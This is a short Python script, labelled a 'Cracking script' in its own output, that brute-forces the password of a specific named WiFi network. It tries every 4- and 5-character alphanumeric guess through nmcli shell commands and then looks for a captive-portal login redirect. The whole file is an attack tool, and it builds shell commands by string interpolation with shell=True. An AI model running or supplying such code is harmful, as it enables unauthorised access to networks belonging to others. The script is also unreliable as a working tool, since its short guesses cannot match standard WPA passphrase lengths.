import subprocess
import requests
import itertools
import string
 
def connect_to_wifi(ssid, password):
    try:
        connect_command = f'nmcli dev wifi connect "{ssid}" password "{password}"'
        subprocess.run(connect_command, shell=True, check=True)
        print(f"Connected to WiFi network: {ssid}")
        return True
    except subprocess.CalledProcessError as e:
        print(f"Failed to connect to WiFi network: {ssid}")
        print(e)
        return False
 
def detect_login_url():
    try:
        test_url = "http://www.google.com"
        response = requests.get(test_url, allow_redirects=True)
        if response.history:
            login_url = response.url
            print(f"Detected login URL: {login_url}")
            return login_url
        else:
            print("No redirection detected. Already connected?")
            return None
    except requests.RequestException as e:
        print("Failed to detect login URL")
        print(e)
        return None
 
def generate_combinations(length):
    characters = string.ascii_letters + string.digits
    for comb in itertools.product(characters, repeat=length):
        yield ''.join(comb)
 
def main():
    ssid = 'SkiTheEast'
    password_lengths = [4, 5]  # Start with 4-character passwords and escalate to 5-character passwords
 
    print('Cracking script started...')
    
    for length in password_lengths:
        for password in generate_combinations(length):
            print(f"Trying password: {password}")
            if connect_to_wifi(ssid, password):
                login_url = detect_login_url()
                if login_url:
                    print(f"Successfully connected and detected login URL: {login_url}")
                    return
                else:
                    print("Failed to detect login URL after connecting")
            print(f"Password {password} failed, trying next...")
 
if __name__ == "__main__":
    main()
